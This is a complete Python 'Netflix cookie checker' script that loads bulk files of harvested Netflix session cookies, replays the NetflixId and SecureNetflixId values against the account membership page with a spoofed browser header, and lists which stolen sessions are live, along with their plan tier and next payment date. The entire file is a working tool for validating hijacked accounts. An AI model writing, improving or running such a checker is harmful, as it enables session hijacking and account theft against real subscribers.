#!/usr/bin/env python3
import os
import re
import requests
import time
from datetime import datetime
from collections import Counter

print(r"""
███╗   ██╗███████╗████████╗███████╗██╗     ██╗██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║     ██║╚██╗██╔╝
██╔██╗ ██║█████╗     ██║   █████╗  ██║     ██║ ╚███╔╝
██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║     ██║ ██╔██╗
██║ ╚████║███████╗   ██║   ██║     ███████╗██║██╔╝ ██╗
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝

            Checker Netflix Cookie Account
            By     : Kenjisubagja / Panji
            Github : kenjisubagja
            FB     : R Panji Subagja
""")

def parse_cookie_file(filename):
    cookies = {}
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if line.strip() and not line.startswith(('#', '-', '*')):
                    parts = line.strip().split('\t')
                    if len(parts) == 7 and parts[0].endswith('.netflix.com'):
                        name = parts[5]
                        if name not in ['gsid', 'profilesNewSession', 'netflix-sans']:
                            cookies[name] = parts[6]
    except:
        pass
    return cookies

def check_netflix_account(filename):
    cookies = parse_cookie_file(filename)
    if not all(k in cookies for k in ['NetflixId', 'SecureNetflixId']):
        return False, '', ''
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.netflix.com/browse',
        'Cache-Control': 'max-age=0'
    }
    
    try:
        # Session flow
        session = requests.Session()
        session.get('https://www.netflix.com/browse', headers=headers, cookies=cookies, timeout=12)
        time.sleep(1)
        
        headers['Cookie'] = '; '.join(f"{k}={cookies[k]}" for k in cookies)
        r = session.get('https://www.netflix.com/account/membership', headers=headers, timeout=12)
        
        if r.status_code != 200:
            return False, '', ''
        
        html = r.text
        
        # **Response HTML**
        payment_match = re.search(
            r'<h3[^>]*data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
            html,
            re.DOTALL | re.I
        )
        
        date = payment_match.group(1).strip() if payment_match else 'Live'
        
        # **EXACT 4K Plan**
        if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I):
            return True, date, '4K 🔥'
        
        # **EXACT  Plan title**
        plan_match = re.search(
            r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<\/',
            html
        )
        if plan_match:
            plan = plan_match.group(1).strip()
            return True, date, plan
        
        # **LIVE CHECK**
        if 'account-membership-page' in html:
            return True, date, 'Live'
        
        return False, '', ''
    except:
        return False, '', ''

def main():
    files = [f for f in os.listdir('.') if re.match(r'NETFLIX Cookies\s*\((\d+)\)\.txt', f)]
    files.sort(key=lambda x: int(re.search(r'\((\d+)\)', x).group(1)))
    
    print(f"Found {len(files)} files\n")
    
    live_accounts = []
    count = 0
    fourk_count = 0
    
    for i, file in enumerate(files, 1):
        is_live, date, res = check_netflix_account(file)
        
        if is_live:
            count += 1
            if '4K' in res:
                fourk_count += 1
                print(f"[{i:3d}] {file:<32} 🎬 {res} | {date} 🔥 #{count}")
            else:
                print(f"[{i:3d}] {file:<32} ✅ {res} | {date} #{count}")
            live_accounts.append((file, date, res))
        else:
            print(f"[{i:3d}] {file:<32} ❌ dead")
        
        time.sleep(2)
    
    print("\n" + "=" * 80)
    print(f"🔥 LIVE: {count} | 4K: {fourk_count}")
    
    stats = Counter(res for _, _, res in live_accounts)
    for plan, num in stats.most_common():
        print(f"  {plan}: {num}")
    
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    with open(f'kenji_{ts}.txt', 'w') as f:
        f.write(f"KENJI  - {count} LIVE\n\n")
        for i, (file, date, res) in enumerate(live_accounts, 1):
            num = re.search(r'\((\d+)\)', file).group(1)
            f.write(f"{i:2d}. ({num}) {res} | {date}\n")
    
    print(f"\n✅ Saved: kenji_{ts}.txt")
    print("🎉 EXACT HTML MATCH! 🚀")

if __name__ == "__main__":
    main()
